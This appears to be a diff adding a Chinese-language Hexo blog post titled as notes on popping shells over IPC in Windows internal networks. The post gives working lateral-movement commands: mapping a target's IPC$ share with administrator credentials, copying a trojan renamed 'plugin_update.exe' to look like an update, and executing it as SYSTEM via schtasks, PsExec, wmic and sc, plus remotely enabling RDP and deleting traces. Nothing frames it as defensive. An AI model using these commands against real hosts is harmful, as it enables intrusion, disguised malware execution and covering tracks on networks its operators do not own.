@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="0x01 首先,想办法把马拷到目标机器上再说:12# net use \\192.168.3.168\ipc$ /user:administrator &amp;quot;admin!@#45&amp;quot;# copy shell.exe \\192.168.3.168\c$\windows\temp\plugin_update.exe
+0x02 利用最常规的copy[xcopy] &amp;amp; schtasks(按说ipc建立以后,schtasks就不用带账号密码了,尤其我这里还是以system权限运行[本身就不需要账号密码],但实际测试中不带就拒绝访问,至于具体原因,暂未知,保险起见还是带上):123# schtasks /create /tn &amp;quot;plugin_update&amp;quot; /tr c:\windows\temp\plugin_update.exe /sc once /st 10:29 /S 192.168.3.168 /RU System  /u administrator /p &amp;quot;admin!@#45&amp;quot; # schtasks /run /tn &amp;quot;plugin_update&amp;quot; /S 192.168.3.168  /u administrator /p &amp;quot;admin!@#45&amp;quot;  你也可以不用等,让目标立即运行任务# schtasks /F /delete /tn &amp;quot;plugin_update&amp;quot; /S 192.168.3.168 /u administrator /p &amp;quot;admin!@#45&amp;quot;">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="John Doe">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="win内网中利用ipc弹shell 小记"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="APT404-不疯不魔怎么活"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>win内网中利用ipc弹shell 小记 - APT404-不疯不魔怎么活</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/09/25/ipc-reverse-shell/">
+                win内网中利用ipc弹shell 小记
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-25</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ipc-note/">ipc note</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 首先,想办法把马拷到目标机器上再说:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># net use \\192.168.3.168\ipc$ /user:administrator &quot;admin!@#45&quot;</span><br><span class="line"># copy shell.exe \\192.168.3.168\c$\windows\temp\plugin_update.exe</span><br></pre></td></tr></table></figure></p>
+<p>0x02 利用最常规的copy[xcopy] &amp; schtasks(按说ipc建立以后,schtasks就不用带账号密码了,尤其我这里还是以system权限运行[本身就不需要账号密码],但实际测试中不带就拒绝访问,至于具体原因,暂未知,保险起见还是带上):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># schtasks /create /tn &quot;plugin_update&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st 10:29 /S 192.168.3.168 /RU System  /u administrator /p &quot;admin!@#45&quot; </span><br><span class="line"># schtasks /run /tn &quot;plugin_update&quot; /S 192.168.3.168  /u administrator /p &quot;admin!@#45&quot;  你也可以不用等,让目标立即运行任务</span><br><span class="line"># schtasks /F /delete /tn &quot;plugin_update&quot; /S 192.168.3.168 /u administrator /p &quot;admin!@#45&quot;</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p><img src="/img/schtasks reverse shell head.jpg" alt=""><br><img src="/img/schtasks reverse shell s.jpg" alt=""><br><img src="/img/schtasks reverse shell system.jpg" alt=""><br></p>
+<p>0x03 通过古老的psexec的方式(对方admin$开启即可,简单粗暴,退出的时候[如果你是用的交互]也许会有服务残留,实际测试中并没有,种马的时候注意不要交互,不然进程会一直挂在哪里)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># PsExec.exe -accepteula \\192.168.3.36 -d -u administrator -p admin c:\windows\temp\plugin_update.exe</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/psexec shell.jpg" alt=""><br></p>
+<p>0x04 通过wmic的方式来远程执行任意指令[ 典型工具 winexec ]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wmic /node:192.168.3.168 /user:administrator /password:admin!@#45 process call create &quot;c:\windows\temp\plugin_update.exe&quot;</span><br><span class="line"># wmic /node:192.168.3.36 /USER:administrator /password:admin PATH win32_terminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1  远程开启对方rdp,08以后的系统可能不太好使</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/wmic shell.jpg" alt=""><br></p>
+<p>0x05 通过sc创建临时服务的方式(记得事先建立好连接,可能需要把exe,bat先注册一下,不然会一直报1053错误(哪位兄弟如果知道怎么更好的解决,还望能告诉小弟一声,感激不尽),但,其实也并不影响,虽然服务报错,但马还是会照常执行(记得shel弹回来以后马上迁徙shell进程,动作要快,不然很快就会断掉,具体原因暂未知),只要shell弹回来就好,用完就顺手删掉即可,关于sc的更多选项请自行查看工具使用帮助):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># net use \\192.168.3.168\ipc$ /user:administrator &quot;admin!@#45&quot;</span><br><span class="line"># sc \\192.168.3.168 create &quot;patch_update&quot; binpath= &quot;cmd /c c:\windows\temp\plugin_update.exe&quot;  这里注意下等号后面的空格别漏了</span><br><span class="line"># sc \\192.168.3.168 start &quot;patch_update&quot;</span><br><span class="line"># sc \\192.168.3.168 delete &quot;patch_update&quot;</span><br><span class="line"># net use \\192.168.3.168\ipc$ /del</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/sc create del.jpg" alt=""><br></p>
+<p>0x06 通过powershell的方式,暂时还有些问题,待后期解决再推上来<br><br></p>
+<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;没啥技术含量,简单记录下,留给有需要的人,搞清楚一些方法的利用前提条件就好(适合在域中或普通的win内网中用)</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/ipc-reverse-shell/">#ipc reverse shell</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2018/01/01/after-roding/">关于接下来的路</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/29/cobalt-strike-spawn/">灵活使用 cobalt strike 的 `spa</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/29/cobalt-strike-dns/">对 Cobalt Strike DNS隧道的理解与</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/27/powershell-pic-execute/">通过图片免杀执行远程powershell代码</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/privilege/">privilege</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/hash-crack/">hash crack</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/LaZagne/">LaZagne</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/python-basic/">python basic</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
